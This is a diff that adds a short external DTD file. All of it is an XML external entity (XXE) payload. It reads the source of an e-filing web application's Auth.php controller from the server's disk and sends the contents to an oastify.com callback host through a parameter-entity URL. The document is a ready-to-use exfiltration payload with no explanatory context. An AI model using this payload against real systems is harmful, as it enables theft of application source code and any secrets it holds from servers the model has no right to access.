@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///var/www/html/efiling/application/controllers/Auth.php">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kocsfm356p2mve28zqkpgm9pegk780wp.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+
